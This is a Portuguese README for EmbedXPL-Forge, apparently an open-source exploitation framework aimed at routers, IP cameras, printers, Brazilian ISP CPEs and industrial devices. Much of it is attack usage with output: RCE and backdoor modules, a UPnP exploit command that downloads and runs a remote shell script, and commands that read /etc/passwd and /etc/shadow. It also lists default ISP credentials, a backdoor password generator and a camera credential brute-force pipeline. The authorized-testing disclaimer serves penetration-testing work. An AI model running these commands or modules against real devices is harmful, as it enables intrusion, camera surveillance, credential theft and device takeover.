<p align="center">
  <img src="docs/img/embedxpl-forge-banner_16x9.png" alt="EmbedXPL-Forge" width="100%">
</p>

# EmbedXPL-Forge

**Framework de Avaliação de Segurança em Dispositivos Embarcados e de Perímetro**

EmbedXPL-Forge é um framework open-source de exploração e scanning para profissionais de segurança auditarem roteadores, switches, câmeras IP, NVR/DVR, GPON ONTs, CPEs de ISP, impressoras, dispositivos IoT, OT/ICS e dispositivos embarcados. Oferece **2800+ módulos ativos** cobrindo testes de credenciais, exploração de vulnerabilidades, varredura de rede, geração de payloads, ataques a câmeras RTSP, manipulação de firmware, arsenal completo de impressoras e orquestração PolyExploit multilinguagem - com **700+ CVEs** mapeados em **114+ fabricantes** e um **APT Group Attack Engine** que reproduz cadeias de ataque reais de grupos nação-estado.

> **Versão:** 2.0.0


## Funcionalidades

- **625+ módulos de exploit** - RCE, auth bypass, path traversal, info disclosure, buffer overflow, DNS hijacking, command injection, backdoor, CSRF, config decrypt, gerador WPA/WPS, gerador de senha de fábrica, chains de heap/stack BOF
- **88 módulos de credenciais** - ataques de dicionário contra FTP, SSH, Telnet, HTTP, SNMP, SFTP
- **185+ módulos para impressoras** - HP, Canon, Lexmark, Xerox, Ricoh, Brother, Epson, Kyocera, Samsung; PJL/IPP/LPD/WSD/CUPS; chains Pwn2Own 2026; PrintingShellz; MS-RPRN NTLM coercion
- **Motor RTSP completo** - portado do [cameradar](https://github.com/ullaakut/cameradar): brute-force de rotas (195+ rotas), brute-force de credenciais (80+ pares), auth Basic/Digest, RTSPS/TLS, **tunelamento RTSP-over-HTTP (Python puro, RFC 2326 App-C)**, scanner nmap/masscan/direto, ONVIF WS-Discovery
- **7 scripts NSE Nmap personalizados** - descoberta RTSP, fingerprint de câmera, validação CVE Hikvision/Dahua, teste de credenciais padrão, verificação multi-vendor CVE, captura de snapshot (`pip install embedxpl[nse]`)
- **Suite de exploração de firmware** - detecção de formato, injeção de backdoor, patch de checksum, bypass de flash por fabricante (NETGEAR, TP-Link, D-Link, ASUS)
- **Orquestrador PolyExploit** - compilação C/C++ em tempo de execução (gcc/clang/mingw/cross), execução de exploits Ruby/Node.js/PHP/Bash/Perl, integração msfconsole, integração ExploitDB/searchsploit
- **Módulos ICS/OT** - Universal Robots PolyScope 5, RIOT OS, Modbus, S7comm, EtherNet/IP, BACnet, DNP3
- **Smart home / marítimo / especializado** - eNet SMART HOME, OpenRemote, Metis maritime IoT (WIC/DFS)
- **5+ módulos de scanner** - AutoPwn, scanners específicos por dispositivo, descoberta WSD/mDNS de impressoras
- **32 módulos de payload** - reverse/bind TCP shells para x86, x64, ARM, MIPS, Python, Perl, PHP
- **13 módulos de encoder** - Base64 e hex encoding para Python, PHP, Perl
- **14 módulos genéricos** - Heartbleed, ShellShock, UPnP IGD, SNMP bruteforce, TCP Xmas, amplificação UDP, consulta CVE, detector DNS hijack, interceptor AITM
- **700+ CVEs mapeados** - de 2001 a 2026, incluindo chains Pwn2Own 2026 e CVEs críticos de IoT/OT/marítimo
- **APT Group Attack Engine** - reproduz cadeias de ataque do APT28, Volt Typhoon, Sandworm, Quad7, Turla, APT40 com mapeamento MITRE ATT&CK
- **23+ wordlists por fabricante** - credenciais padrão externalizadas por vendor (incluindo ISPs brasileiros específicos)
- **Módulos ISP Brasil** - CPEs ZTE, Huawei, Intelbras e TP-Link distribuídos pelos principais provedores brasileiros (Vivo, Claro, OI, TIM)
- **FCC-ID Lookup** - consulta ao banco FCC para recuperar firmware, manuais e fotos internas de qualquer dispositivo registrado
- **iSpy Camera DB** - integração com banco de 6.000+ modelos de câmera para rotas RTSP e credenciais padrão
- **7 automated quality gates** - `tools/phase_gate.py` garante que cada módulo passa verificações de importação, anti-falso-positivo, referências e qualidade de código

## Tipos de Dispositivos Suportados

| Tipo | Cobertura | Descrição |
|------|-----------|-----------|
| **Roteadores / GPON ONT / CPE** | 580+ módulos | Roteadores SOHO, gateways enterprise, CPE/ONT GPON |
| **Câmeras IP / NVR / DVR** | 60+ módulos | Hikvision, Dahua, Axis, Reolink, Amcrest, Uniview, Tapo, Swann, ANNKE, Edimax, Intelbras e mais |
| **Impressoras / MFP** | 185+ módulos | HP, Canon, Lexmark, Xerox, Ricoh, Brother, Epson, Kyocera, Samsung; IPP/PJL/LPD/WSD/CUPS |
| **NAS (Armazenamento em Rede)** | 20+ módulos | QNAP, Synology, D-Link NAS, Zyxel |
| **VPN / Firewall / NGFW / Segurança de Perímetro** | **202 módulos** | Palo Alto, Fortinet, Cisco ASA/FTD/FMC, Check Point, Juniper, SonicWall, Sophos, WatchGuard, Zyxel, F5 BIG-IP, Citrix/NetScaler, Ivanti, Pulse Secure, pfSense, OPNsense, Barracuda, Imperva, MikroTik, Huawei USG, Stormshield, Hillstone, Sangfor, H3C, Radware, Symantec ProxySG, Trend Micro TippingPoint, Trellix, Arista EOS, OpenVPN AS, Phoenix Contact mGuard, Siemens SCALANCE, Moxa EDR, VyOS, IPFire, Kerio, Cisco Meraki, Array Networks + módulos de bypass de protocolo OT/ICS |
| **Switches L2/L3** | 3 módulos | Switches gerenciados (Cisco, D-Link, NETGEAR) |
| **SOHO Edge** | 9 módulos | Roteadores de viagem, NAS, APs wireless |
| **ICS / OT / Industrial** | 35+ módulos | PLCs, SCADA, Modbus, S7comm, EtherNet/IP, Universal Robots PolyScope 5 |
| **Smart Home / Marítimo** | 10+ módulos | eNet SMART HOME, OpenRemote IoT, Metis maritime WIC/DFS |
| **SO Embarcado** | 25+ módulos | RIOT OS, OpenWrt, VxWorks, QNX, wolfSSL, Tuya Arduino SDK |

## Fabricantes Suportados

**Equipamentos de rede:** 2Wire · 3Com · ActionTec · Alcatel-Lucent · Alpha Networks · Arris · Aruba · Asmax · Astoria · ASUS · Belkin · BHU · Billion · Binatone · Calix · CERIO · Cisco · Cobham · Comtrend · D-Link · DD-WRT · Draytek · EasyBox (Arcadyan) · Edimax · EE BrightBox · FiberHome · Fortinet · Freebox · GL.iNet · GPON · HooToo · Huawei · Intelbras · IPFire · Juniper · LG · Linksys · Mercury · MiFi (Novatel) · MikroTik · MitraStar · Motorola · Movistar · Netcore · NETGEAR · Netsys · Observa Telecom · OpenWrt · RuggedCom · Ruijie · Seagate · SerComm · Shuttle · Sitecom · SMC · SonicWall · Starbridge · Technicolor · Tenda · Thomson · TOTOLINK · TP-Link · TRENDnet · Ubee · Ubiquiti · Unicorn · UTStarcom · Wavlink · Xiaomi · Zhone · Zoom · ZTE · ZyXEL

**Câmeras / NVR / DVR:** Hikvision · Dahua · Axis · Reolink · Amcrest · Uniview (UNV) · Tapo (TP-Link) · Swann · ANNKE · Edimax · Intelbras · Grandstream · Foscam · Acti · Avigilon · Beward · Brickcom · Cisco câmeras · Geuterbruck · Honeywell câmeras · Jovision · Siemens câmeras · Xiongmai (OEM) · Zivif · MVPower DVR · Câmeras P2P WiFi genéricas · DVR/NVR OEM genérico

**NAS / VPN / Segurança:** QNAP · Synology · D-Link NAS · Zyxel NAS · Ivanti · SonicWall · Fortinet · Avocent

## Instalação

### Opção 1 - PyPI (recomendado)

```bash
pip install embedxpl
embedxpl
```

### Opção 2 - Com scripts Nmap NSE

```bash
pip install "embedxpl[nse]"
python -m embedxpl.nse install   # pode exigir sudo no Linux/macOS
embedxpl-nse list
```

### Opção 3 - A partir do código-fonte

```bash
git clone https://github.com/mrhenrike/EmbedXPL-Forge.git
cd EmbedXPL-Forge
pip install -r requirements.txt
python exf.py
```

## Uso Rápido

```
# Shell interativo
python exf.py

# Módulo de roteador - RCE Netgear DGN1000B
exf > use exploits/routers/netgear/dgn1000b_remote_command_execution
exf (DGN1000B RCE) > set target 192.168.1.1
exf (DGN1000B RCE) > run

# Gerador de chave WPA padrão - EasyBox (Arcadyan)
exf > use exploits/routers/easybox/easybox_wpa_keygen
exf (EasyBox WPA Keygen) > set target 192.168.1.1
exf (EasyBox WPA Keygen) > run

# Backdoor RCE - Seagate NAS Ghost PHP
exf > use exploits/routers/seagate/seagate_nas_php_backdoor
exf (Seagate Ghost PHP) > set target 192.168.1.100
exf (Seagate Ghost PHP) > set cmd "id; uname -a"
exf (Seagate Ghost PHP) > run

# Alpha Networks / ZTE - web_shell_cmd.gch backdoor
exf > use exploits/routers/alpha_networks/web_shell_cmd_rce
exf (Alpha Networks web_shell_cmd RCE) > set target 192.168.1.1
exf (Alpha Networks web_shell_cmd RCE) > set cmd "cat /etc/passwd"
exf (Alpha Networks web_shell_cmd RCE) > run

# RuggedCom - gerador de senha de backdoor de fábrica
exf > use exploits/routers/ruggedcom/ruggedcom_factory_password
exf (RuggedCom Factory Password) > set target 192.168.1.1
exf (RuggedCom Factory Password) > set serial RA000000
exf (RuggedCom Factory Password) > run
[*] Calculando senha para serial: RA000000
[+] Backdoor user : factory
[+] Backdoor pass : 7f3d9a2b

# Motor de câmera RTSP - ataque completo
exf > use exploits/cameras/multi/rtsp_cameradar_attack
exf (RTSP Cameradar Attack) > set target 192.168.1.100
exf (RTSP Cameradar Attack) > run

# Descoberta de rede
exf > discover 192.168.1.0/24

# APT Group Attack Engine
exf > apt list
exf > apt show apt28
exf > apt run apt28
```

## Comandos Principais

| Comando | Descrição |
|---------|-----------|
| `use <modulo>` | Selecionar um módulo |
| `show options` | Exibir opções configuráveis |
| `show info` | Exibir metadados e referências |
| `set <opcao> <valor>` | Configurar uma opção |
| `check` | Verificar se o alvo é vulnerável |
| `run` | Executar o módulo |
| `search <termo>` | Buscar módulos por palavra-chave |
| `discover [subnet]` | Escanear subnet e sugerir módulos |
| `apt list\|show\|run` | Motor de ataque APT group |
| `sessions list\|show\|export` | Gerenciar histórico de sessões |

## Scripts NSE Nmap

```bash
# Instalar scripts NSE do EmbedXPL
pip install "embedxpl[nse]"
python -m embedxpl.nse install

# Descoberta RTSP
nmap -p 554,5554,8554 --script embedxpl-rtsp-discover 192.168.1.0/24

# Verificação de CVE Hikvision
nmap -p 80,443,8000 --script embedxpl-hikvision-vuln 192.168.1.100

# Identificação de câmera
nmap -p 80,443,554 --script embedxpl-camera-identify 192.168.1.0/24

# Verificação multi-vendor CVE IoT
nmap -p 80,443,8080 --script embedxpl-iot-cve-check 192.168.1.0/24

# Capture snapshot sem autenticação
nmap -p 80,8080 --script embedxpl-camera-snapshot 192.168.1.100
```

## Estrutura de Módulos

```
embedxpl/
├── core/
│   ├── rtsp/          # Motor RTSP completo
│   └── poly/          # Orquestrador PolyExploit (C/C++, Ruby, Node.js, PHP, Bash, Perl)
├── modules/
│   ├── creds/             # Testes de credenciais
│   ├── exploits/
│   │   ├── cameras/       # Câmeras IP por fabricante
│   │   ├── firmware/      # Exploração de firmware
│   │   ├── nas/           # NAS (QNAP, Synology, D-Link NAS)
│   │   ├── routers/       # Roteadores por fabricante (85 pastas de vendor)
│   │   ├── vpn/           # Appliances VPN/firewall
│   │   └── switches/      # Exploits de switches
│   ├── scanners/          # Varredura e AutoPwn
│   ├── payloads/          # Shells reversos/bind (multi-arch)
│   ├── encoders/          # Encoding de payloads
│   └── generic/           # Ferramentas genéricas
├── nse/                   # Gerenciador de scripts NSE
└── resources/rtsp/        # Rotas e credenciais RTSP
```

## Cobertura Routerpwn / Backdoor / Senha de Fábrica

27+ módulos de exploit portados de uma auditoria completa do [routerpwn.com](https://github.com/hkm/routerpwn.com) e do [routerPWN](https://github.com/lilloX/routerPWN), com foco em senhas de fábrica, backdoors hardcoded, geradores WPA padrão e CSRF de DNS hijack. **27+ módulos** cobrindo **19+ fabricantes**:

| Fabricante | Técnica explorada |
|------------|-------------------|
| Alcatel-Lucent | OmniPCX Enterprise RCE via masterCGI · OmniSwitch CSRF add admin |
| Alpha Networks / ZTE | Backdoor `/web_shell_cmd.gch` · download de config sem auth |
| Astoria | Reset de senha admin sem autenticação via `setup_pass.cgi` |
| Binatone | CSRF mudança de admin via `Forms/tools_admin_1` |
| DD-WRT | `Info.live.htm` (BID-35742) disclosure · injeção de comando via diagnóstico ping |
| EasyBox (Arcadyan) | Gerador de chave WPA2 de fábrica (algoritmo MAC → MD5) |
| EE BrightBox | Disclosure de configuração via `cgi_status.js` sem auth |
| Freebox | Reboot forçado via `system.cgi` sem autenticação |
| MiFi (Novatel) | Download de backup `config.xml.savefile` - credenciais expostas |
| Motorola SBG6580 | DNS CSRF + mudança de senha admin + reboot |
| Observa Telecom | Disclosure JSON de credenciais + DNS CSRF + ativação FTP |
| RuggedCom | Gerador de senha de backdoor de fábrica (FD 2012/Apr/277) |
| Seagate NAS | "Ghost PHP" RCE - `d41d8cd98f...php` (CVE-2014-8684) |
| Sitecom | DC-227 backdoor + gerador WPA WLR-4004 (eMaze 2014) |
| Starbridge | Lynx 526 reset de senha sem auth via `password.cgi` |
| Ubee | Bypass credencial de operador para modems a cabo (Cablemas ISP) |
| Unicorn | WB-3300NR factory reset + DNS CSRF sem auth |
| UTStarcom | Disclosure de credenciais PPPoE via `ppppassword.html` |
| Zoom | X4/X5 criação de admin via `PopOutUserAdd.htm` (EDB-26736) |

## Arquitetura do Framework (v2.0.0)

### Arquitetura de Componentes

Visão em camadas do framework: camada CLI, Core Engine (orquestrador, clientes de protocolo, shell engines), Camada de Inteligência (ML, OUI, banco CVE), Quality Gates e o arsenal de 2800+ módulos organizados por categoria.

<p align="center">
  <img src="docs/assets/embedxpl_architecture.png" width="960" alt="EmbedXPL-Forge Arquitetura de Componentes v2.0.0"/>
</p>

### Fluxo de Auditoria e Exploração

Fluxo de ponta a ponta: entrada do alvo, descoberta, identificação, seleção de módulo, exploração e relatório.

<p align="center">
  <img src="docs/assets/embedxpl_flow.png" width="960" alt="EmbedXPL-Forge Fluxo de Exploração v2.0.0"/>
</p>

---

## Módulos ISP Brasileiros (v2.0.0)

Cobertura específica para CPEs e ONTs fornecidos pelos principais provedores de banda larga do Brasil. Wordlists de credenciais padrão externalizadas por ISP e modelo, além de exploits específicos para firmwares distribuídos no mercado nacional.

### ZTE (Vivo Fibra, OI Fibra, TIM)

| Modelo | ISP | Vulnerabilidade | Módulo |
|--------|-----|-----------------|--------|
| ZXHN H288A | OI Fibra | CVE-2020-9344 - auth bypass via URL hardcoded | `exploits/routers/zte/zxhn_h288a_auth_bypass` |
| ZXHN F660 v6/v7 | Vivo Fibra | Senha de fábrica gerável a partir do MAC address | `exploits/routers/zte/zte_f660_default_keygen` |
| ZXHN F670L | Vivo Fibra | Download de config sem autenticação via `/UserCfg.conf` | `exploits/routers/zte/zte_f670l_config_download` |
| ZXHN H268A | TIM | Backdoor Telnet ativável via SNMP community padrão | `exploits/routers/zte/zte_h268a_telnet_snmp_backdoor` |
| ZXHN H388X | Vivo Fibra | Path traversal em `nvmPrintf.cgi` (EDB-51952) | `exploits/routers/zte/zte_h388x_path_traversal` |

```bash
# CVE-2020-9344 - ZTE ZXHN H288A auth bypass
exf > use exploits/routers/zte/zxhn_h288a_auth_bypass
exf (H288A AuthBypass) > set target 192.168.1.1
exf (H288A AuthBypass) > run

[*] Verificando CVE-2020-9344 em 192.168.1.1...
[*] Tentando acesso a /getpage.gch?pid=1002&nextpage=Internet_easy_adsl_en.gch sem auth
[+] VULNERÁVEL - Página de configuração acessível sem autenticação
[+] PPPoE username: cliente@vivo.com.br
[+] Status PPPoE: Connected | IP WAN: 177.x.x.x

# ZTE F660 keygen - gerar senha de fábrica a partir do MAC
exf > use exploits/routers/zte/zte_f660_default_keygen
exf (ZTE F660 Keygen) > set mac 00:26:2D:AA:BB:CC
exf (ZTE F660 Keygen) > run

[*] Gerando credenciais de fábrica para ZTE F660...
[+] Admin user: admin
[+] Admin pass: Vivo1234
[+] Super user: superuser
[+] Super pass: Sxxx (calculado do MAC)
[*] Válido para firmwares ZXHN F660 V6.0.10P6T2 e anteriores
```

### Huawei (Claro Fibra, OI, NET)

| Modelo | ISP | Vulnerabilidade | Módulo |
|--------|-----|-----------------|--------|
| HG8245H / HG8245H5 | Claro Fibra | Credenciais padrão por ISP (`telecomadmin`/`admintelecom`) | `creds/routers/huawei_isp_brazil` |
| EG8145X6 | Claro Fibra | CVE-2017-17215 (UPnP RCE) em firmwares legados | `exploits/routers/huawei/eg8145x6_upnp_rce_chain` |
| HG659 | OI Fibra | Exposição do endpoint `/api/system/deviceinfo` sem auth | `exploits/routers/huawei/hg659_info_disclosure` |
| HG532e | NET/Claro | CVE-2017-17215 - injeção de comando via UPnP SOAP | `exploits/routers/huawei/hg532_upnp_rce_cve_2017_17215` |

```bash
# Huawei HG532 CVE-2017-17215 - UPnP RCE (usado por Mirai/Satori)
exf > use exploits/routers/huawei/hg532_upnp_rce_cve_2017_17215
exf (HG532 UPnP RCE) > set target 192.168.1.1
exf (HG532 UPnP RCE) > set cmd "busybox wget http://192.168.1.50/shell.sh -O /tmp/s && sh /tmp/s"
exf (HG532 UPnP RCE) > check

[*] Verificando CVE-2017-17215 em 192.168.1.1:37215...
[+] Endpoint UPnP responde em /ctrlt/DeviceUpgrade_1
[+] VULNERÁVEL - Firmware sem patch

exf (HG532 UPnP RCE) > run

[+] Payload SOAP enviado via HTTP POST para :37215
[+] Execução remota confirmada (HTTP 200)

# Credenciais padrão de ISPs brasileiros para Huawei
exf > use creds/routers/huawei_isp_brazil
exf (Huawei ISP BR) > set target 192.168.1.1
exf (Huawei ISP BR) > set isp claro
exf (Huawei ISP BR) > run

[*] Testando credenciais Claro/NET para Huawei HG8245H5...
[+] LOGIN VÁLIDO: telecomadmin / admintelecom (conta de suporte)
[+] LOGIN VÁLIDO: root / admin (acesso telnet)
[*] Outros ISPs suportados: vivo, oi, tim, nextel
```

### Intelbras (GVT/Vivo, provedores regionais)

| Modelo | ISP | Vulnerabilidade | Módulo |
|--------|-----|-----------------|--------|
| GF1200 | Vivo/GVT Fibra | Exposição SNMP community `public` sem autenticação | `exploits/routers/intelbras/gf1200_snmp_info_disclosure` |
| GF400 | Vivo/GVT Fibra | Credenciais padrão `admin`/`admin` persistentes | `creds/routers/intelbras_default` |
| W5-1200F | Provedores regionais | CSRF em painel web + DNS hijack sem token | `exploits/routers/intelbras/w5_1200f_csrf_dns_hijack` |
| RF 301K | Provedores regionais | Auth bypass via manipulação de sessão em `/cgi-bin/config.exp` | `exploits/routers/intelbras/rf301k_session_bypass` |

```bash
# Intelbras GF1200 - SNMP disclosure sem autenticação
exf > use exploits/routers/intelbras/gf1200_snmp_info_disclosure
exf (GF1200 SNMP) > set target 192.168.1.1
exf (GF1200 SNMP) > run

[*] Consultando SNMP community 'public' em 192.168.1.1:161...
[+] System Description: Intelbras GF1200 v1.2.3
[+] Interface WAN: ppp0 IP=177.x.x.x
[+] Hostname: Intelbras-GF1200-XXXXXX
[+] Uptime: 12 dias 4 horas
[+] PPPoE username: cliente@provedor.com.br (OID 1.3.6.1.2.1.2.2.1.2.1)

# Intelbras W5-1200F - CSRF DNS hijack
exf > use exploits/routers/intelbras/w5_1200f_csrf_dns_hijack
exf (W5-1200F CSRF) > set target 192.168.1.1
exf (W5-1200F CSRF) > set dns1 8.8.8.8
exf (W5-1200F CSRF) > set dns2 1.1.1.1
exf (W5-1200F CSRF) > run

[*] Enviando requisição CSRF para /cgi-bin/set_dns_server.cgi...
[+] DNS primário alterado: 8.8.8.8
[+] DNS secundário alterado: 1.1.1.1
[!] Sem token CSRF - a requisição foi aceita sem autenticação
```

### TP-Link / Sagemcom (Claro TV Box, NET, provedores regionais)

| Modelo | ISP | Vulnerabilidade | Módulo |
|--------|-----|-----------------|--------|
| TD-W9970 | TIM Fibra | CVE-2020-10882 - RCE via tddp (port 1040 UDP) | `exploits/routers/tplink/td_w9970_tddp_rce_cve_2020_10882` |
| Archer VR400 | Diversos | CVE-2021-41538 - password disclosure via `/cgi-bin/luci` | `exploits/routers/tplink/archer_vr400_passwd_disclosure` |
| Sagemcom F@ST 5655v2 | Vivo Fibra | Config download via `http://192.168.15.1/config.bin` sem auth | `exploits/routers/sagemcom/fast5655_config_download` |
| Sagemcom F@ST 3764 | Claro/NET | Backdoor SSH com chave privada embutida no firmware | `exploits/routers/sagemcom/fast3764_hardcoded_ssh_key` |

```bash
# TP-Link TD-W9970 CVE-2020-10882 - TDDP RCE
exf > use exploits/routers/tplink/td_w9970_tddp_rce_cve_2020_10882
exf (TD-W9970 TDDP RCE) > set target 192.168.1.1
exf (TD-W9970 TDDP RCE) > check

[*] Verificando CVE-2020-10882 em 192.168.1.1:1040 (UDP)...
[+] Porta TDDP 1040/UDP respondendo
[+] VULNERÁVEL - Versão TDDP < 1.1 detectada

exf (TD-W9970 TDDP RCE) > set cmd "cat /etc/shadow"
exf (TD-W9970 TDDP RCE) > run

[+] Execução remota via TDDP protocolo
[+] root:$1$xxx...:0:0:root:/:/bin/sh

# Sagemcom F@ST 5655v2 - config download
exf > use exploits/routers/sagemcom/fast5655_config_download
exf (Sagemcom Config DL) > set target 192.168.15.1
exf (Sagemcom Config DL) > run

[*] Baixando config.bin de http://192.168.15.1/config.bin...
[+] Arquivo obtido: config.bin (328 KB)
[+] Descriptografando configuração...
[+] PPPoE user: cliente@vivo.com.br
[+] PPPoE pass: [REDACTED - exibir com: set show_creds true]
[+] WiFi SSID: VivoFibra-XXXX
[+] WiFi WPA2 Key: [REDACTED]
```

> **Aviso Legal:** Os módulos ISP Brasil destinam-se exclusivamente a testes de penetração autorizados
> em equipamentos de sua propriedade ou com autorização escrita do cliente/provedor.
> Acesso não autorizado a sistemas de terceiros é crime (Lei 12.737/12 - Lei Carolina Dieckmann).

---

## FCC-ID Lookup

Consulta ao banco de dados público da FCC (Federal Communications Commission) para recuperar documentação técnica de qualquer dispositivo sem fio registrado: firmware original, manual de serviço, fotos internas, relatórios de teste SAR/RF.

```bash
# Consultar dispositivo pelo FCC-ID
exf > use generic/fccid/fcc_id_lookup
exf (FCC-ID Lookup) > set fcc_id 2ADLE-F670L
exf (FCC-ID Lookup) > run

[*] Consultando FCC database para: 2ADLE-F670L
[+] Fabricante: ZTE Corporation
[+] Grantee Code: 2ADLE
[+] Produto: ZXHN F670L (GPON ONT)
[+] Aprovado em: 2021-03-15
[+] Frequências: 2.4 GHz (802.11b/g/n), 5 GHz (802.11a/n/ac)
[+] Documentos disponíveis:
    - User Manual: https://apps.fcc.gov/eas/GetApplicationAttachment.html?id=...
    - Internal Photos: https://apps.fcc.gov/eas/GetApplicationAttachment.html?id=...
    - RF Test Report: https://apps.fcc.gov/eas/GetApplicationAttachment.html?id=...
    - Firmware (se disponível): https://apps.fcc.gov/eas/GetApplicationAttachment.html?id=...

# Busca por fabricante + modelo
exf > use generic/fccid/fcc_id_lookup
exf (FCC-ID Lookup) > set search_grantee "Intelbras"
exf (FCC-ID Lookup) > set search_description "GF1200"
exf (FCC-ID Lookup) > run

[*] Buscando dispositivos Intelbras com 'GF1200'...
[+] FCC-ID: Q87-GF1200 | Produto: GF1200 | Aprovado: 2019-08-22
[+] FCC-ID: Q87-GF1200V2 | Produto: GF1200 v2 | Aprovado: 2020-11-10
[*] Use 'set fcc_id Q87-GF1200' para obter detalhes e documentos

# Extrair firmware de documentos FCC (quando disponível)
exf > use generic/fccid/fcc_firmware_extractor
exf (FCC Firmware) > set fcc_id 2ADLE-F670L
exf (FCC Firmware) > set output_dir /tmp/fcc_firmware
exf (FCC Firmware) > run

[*] Procurando anexos de firmware para 2ADLE-F670L...
[+] Encontrado: V1.0.0P5T16_D30.bin (12.4 MB)
[+] Download concluído: /tmp/fcc_firmware/2ADLE-F670L_firmware.bin
[*] Para análise: use generic/firmware/firmware_analyzer
```

---

## iSpy Camera DB

Integração com o banco de dados iSpy (ispyconnect.com/cameras) contendo 6.000+ modelos de câmeras com rotas RTSP testadas, credenciais padrão por fabricante e configurações de conexão.

```bash
# Buscar rotas RTSP por fabricante
exf > use generic/ispydb/ispy_camera_lookup
exf (iSpy DB) > set vendor Hikvision
exf (iSpy DB) > run

[*] Consultando iSpy Camera DB para: Hikvision
[+] 47 modelos encontrados
[+] Rotas RTSP mais comuns:
    /Streaming/Channels/101      (Main stream - alta resolução)
    /Streaming/Channels/102      (Sub stream - baixa resolução)
    /h264/ch1/main/av_stream     (formato legado)
    /h264/ch1/sub/av_stream      (sub stream legado)
[+] Credenciais padrão: admin/(vazio), admin/12345, admin/admin123
[+] Porta padrão: 554 (RTSP), 8000 (SDK), 80/443 (HTTP)

# Buscar câmera específica
exf > use generic/ispydb/ispy_camera_lookup
exf (iSpy DB) > set vendor Intelbras
exf (iSpy DB) > set model "VIP 1020"
exf (iSpy DB) > run

[*] Buscando Intelbras VIP 1020 na iSpy DB...
[+] Modelo: Intelbras VIP 1020 B
[+] Rota RTSP: /cam/realmonitor?channel=1&subtype=0
[+] Credenciais padrão: admin/(vazio)
[+] Porta: 554
[+] URL completa: rtsp://admin:@<IP>:554/cam/realmonitor?channel=1&subtype=0

# Enriquecer scan RTSP com dados iSpy
exf > use exploits/cameras/multi/rtsp_cameradar_attack
exf (RTSP Cameradar Attack) > set target 192.168.1.0/24
exf (RTSP Cameradar Attack) > set use_ispy_db true
exf (RTSP Cameradar Attack) > run

[*] Escaneando 192.168.1.0/24 nas portas 554, 5554, 8554...
[*] Host com RTSP detectado: 192.168.1.100:554
[*] Fingerprint: Hikvision DS-2CD2143G2-I (iSpy DB match)
[*] Aplicando rotas e credenciais específicas para Hikvision...
[+] Rota descoberta: /Streaming/Channels/101
[+] Credenciais: admin:(vazio)
[+] Stream acessível: rtsp://admin:@192.168.1.100:554/Streaming/Channels/101
```

---

## Motor RTSP - Uso Avançado

Motor RTSP completo portado do [cameradar](https://github.com/ullaakut/cameradar) e estendido com funcionalidades nativas em Python.

### Modos de Transporte

| Modo | Porta | Descrição |
|------|-------|-----------|
| `rtsp` | 554 | RTSP padrão via TCP |
| `rtsps` | 443/8443 | RTSP sobre TLS |
| `http` | 80/8080 | Tunelamento RTSP-over-HTTP (RFC 2326 App-C) |
| `https` | 443/8443 | Tunelamento RTSP-over-HTTPS |
| `auto` | any | Detecção automática do modo pelo host/porta |

### Pipeline de Ataque Completo

```bash
# Ataque RTSP completo em sub-rede
exf > use exploits/cameras/multi/rtsp_cameradar_attack
exf (RTSP Cameradar Attack) > set target 192.168.1.0/24
exf (RTSP Cameradar Attack) > set ports 554,5554,8554,8080
exf (RTSP Cameradar Attack) > set timeout 5.0
exf (RTSP Cameradar Attack) > set output_m3u /tmp/cameras.m3u
exf (RTSP Cameradar Attack) > run

[*] Escaneando 192.168.1.0/24 nas portas [554, 5554, 8554, 8080]...
[*] Hosts RTSP encontrados: 3
[*] 192.168.1.100:554 - Fase 1: Descoberta de rota (195 rotas)...
[*] 192.168.1.100:554 - Rota encontrada: h264/ch1/main/av_stream
[*] 192.168.1.100:554 - Fase 2: Detecção de auth - Basic (realm="IP Camera")
[*] 192.168.1.100:554 - Fase 3: Brute-force de credenciais (80 pares)...
[+] 192.168.1.100:554 - Credenciais: admin:(vazio)
[+] 192.168.1.100:554 - Stream validado (200 OK)
[*] Ataque concluído. Streams acessíveis: 2/3
[+] Playlist M3U salva: /tmp/cameras.m3u

# Tunelamento RTSP-over-HTTP (câmeras atrás de proxy)
exf > use exploits/cameras/multi/rtsp_http_tunnel_attack
exf (RTSP-over-HTTP) > set target 10.0.0.50
exf (RTSP-over-HTTP) > set port 8080
exf (RTSP-over-HTTP) > run

[*] Iniciando tunelamento RTSP-over-HTTP para 10.0.0.50:8080...
[*] Enviando GET /stream com x-sessioncookie...
[*] Enviando POST /stream com RTSP DESCRIBE encapsulado...
[+] Tunnel estabelecido - câmera responde via HTTP
[+] Rota: /video.mjpg
[+] URL: http://10.0.0.50:8080/video.mjpg

# ONVIF WS-Discovery + ataque
exf > use exploits/cameras/multi/onvif_ws_discovery
exf (ONVIF Discovery) > set subnet 192.168.1.0/24
exf (ONVIF Discovery) > run

[*] Enviando WS-Discovery Probe para 239.255.255.250:3702...
[+] Dispositivo ONVIF: 192.168.1.105 (Dahua IPC-HDW2831T-AS)
[+] Dispositivo ONVIF: 192.168.1.110 (Hikvision DS-2CD2T47G2-L)
[*] Iniciando ataque de credenciais ONVIF...
[+] 192.168.1.105 - admin:admin123 (ONVIF + RTSP)
[+] Stream: rtsp://admin:admin123@192.168.1.105:554/cam/realmonitor
```

### API Python - Uso Programático

```python
from embedxpl.core.rtsp.scanner  import RTSPScanner
from embedxpl.core.rtsp.attacker import RTSPAttacker

# 1. Descobrir hosts RTSP na rede
scanner = RTSPScanner(timeout=5.0)
hosts = scanner.scan_network("192.168.1.0/24", ports=[554, 5554, 8554])
# Retorna: [('192.168.1.100', 554), ('192.168.1.101', 8554), ...]

# 2. Executar pipeline de ataque completo (5 fases)
attacker = RTSPAttacker(timeout=5.0)
results = attacker.attack_all(hosts)

# 3. Inspecionar resultados
for stream in results:
    print(stream.url)         # rtsp://admin:@192.168.1.100:554/h264/ch1/main/av_stream
    print(stream.username)    # admin
    print(stream.password)    # (string vazia)
    print(stream.route)       # h264/ch1/main/av_stream
    print(stream.auth_type)   # AuthType.BASIC
    print(stream.accessible)  # True

# 4. Atacar hosts conhecidos diretamente (sem scan)
hosts = scanner.skip_scan(["192.168.1.100:554", "192.168.1.101"])
results = attacker.attack_all(hosts)
```

---

## Requisitos

- Python 3.8+
- Opcional: `nmap` (binário) para descoberta e scripts NSE
- Opcional: `masscan` para descoberta RTSP de alta velocidade
- Opcional: `gcc`/`clang` para compilação C/C++ pelo PolyExploit
- Opcional: `msfconsole` para integração Metasploit via PolyRunner

**Dependências Python (instaladas automaticamente):**
`requests`, `paramiko`, `pysnmp`, `pycryptodome`, `scapy`, `colorama`, `rich`, `python-nmap`, `aiohttp`

## Aviso Legal

